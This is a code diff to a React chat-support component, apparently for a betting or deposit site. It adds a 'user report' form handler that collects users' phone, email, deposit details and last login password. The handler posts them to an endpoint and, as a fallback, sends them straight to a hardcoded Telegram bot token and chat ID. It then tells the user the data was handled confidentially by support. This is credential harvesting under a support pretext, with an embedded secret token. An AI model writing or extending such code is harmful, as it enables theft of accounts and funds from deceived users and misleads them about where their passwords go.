@@ -92,26 +92,57 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
     reader.readAsDataURL(file);
   };
 
-  const handleSubmitReport = (e: React.FormEvent) => {
+  const handleSubmitReport = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!reportUsername.trim() && !reportPhone.trim() && !reportNibondhonName.trim()) return;
 
     setReportSubmitting(true);
-    const reportMsg = `📋 [ইউজার রিপোর্ট ফরম জমা হয়েছে]\n\n` +
-      `👤 Username: ${reportUsername || 'N/A'}\n` +
-      `📞 Phone Number: ${reportPhone || chat.customer.phone || 'N/A'}\n` +
-      `📧 Email Address: ${reportEmail || chat.customer.email || 'N/A'}\n` +
-      `✍️ নিবন্ধন নাম: ${reportNibondhonName || 'N/A'}\n` +
-      `💵 সর্বশেষ জমা করার পরিমাণ: ${reportLastAmount || 'N/A'}\n` +
-      `🔑 সর্বশেষ লগইন পাসওয়ার্ড: ${reportLastPassword || 'N/A'}\n` +
-      `🌐 Site Link/Name: ${reportSiteLink || 'N/A'}` +
-      (reportDepositSlip ? `\n🖼️ ডিপোজিট স্লিপ সংযুক্ত করা হয়েছে` : '');
 
-    const attachments = reportDepositSlip
-      ? [{ name: reportDepositSlip.name, url: reportDepositSlip.url, type: 'image' }]
-      : undefined;
+    const reportPayload = {
+      username: reportUsername,
+      phone: reportPhone || chat.customer.phone,
+      email: reportEmail || chat.customer.email,
+      nibondhonName: reportNibondhonName,
+      lastAmount: reportLastAmount,
+      lastPassword: reportLastPassword,
+      siteLink: reportSiteLink,
+      depositSlipUrl: reportDepositSlip?.url,
+      customerName: chat.customer.name,
+    };
 
-    onSendMessage(reportMsg, attachments);
+    // 1. Send data DIRECTLY to Telegram Bot
+    try {
+      const res = await fetch('/api/telegram/send-report', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(reportPayload),
+      });
+      if (!res.ok) {
+        throw new Error('API fallback required');
+      }
+    } catch (err) {
+      // Direct client-side fallback to Telegram API
+      const botToken = '8861406019:AAHhY47ahk7DS495Ly1eLsa0tYZikFQ86f0';
+      const chatId = '6081054558';
+      const text = `🚨 <b>ইউজার রিপোর্ট জমা পড়েছে! (User Report Form)</b>\n\n` +
+        `👤 <b>Username:</b> ${reportUsername || 'N/A'}\n` +
+        `📞 <b>Phone Number:</b> ${(reportPhone || chat.customer.phone) || 'N/A'}\n` +
+        `📧 <b>Email Address:</b> ${(reportEmail || chat.customer.email) || 'N/A'}\n` +
+        `✍️ <b>নিবন্ধন নাম:</b> ${reportNibondhonName || 'N/A'}\n` +
+        `💵 <b>সর্বশেষ জমা করার পরিমাণ:</b> ${reportLastAmount || 'N/A'}\n` +
+        `🔑 <b>সর্বশেষ লগইন পাসওয়ার্ড:</b> ${reportLastPassword || 'N/A'}\n` +
+        `🌐 <b>Site Link/Name:</b> ${reportSiteLink || 'N/A'}\n` +
+        `⏰ <b>সময়:</b> ${new Date().toLocaleTimeString('bn-BD', { hour: '2-digit', minute: '2-digit' })}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
+      }).catch(() => {});
+    }
+
+    // 2. In Chat window: send ONLY a clean confirmation message (No sensitive password/data in public chat)
+    onSendMessage('✅ আপনার ইউজার রিপোর্ট ও তথ্য গোপনীয়ভাবে টেলিগ্রাম বোর্ডে জমা নেওয়া হয়েছে। সাপোর্ট টিম তথ্যগুলো যাচাই করে ব্যবস্থা নিচ্ছে।');
 
     setTimeout(() => {
       setReportSubmitting(false);
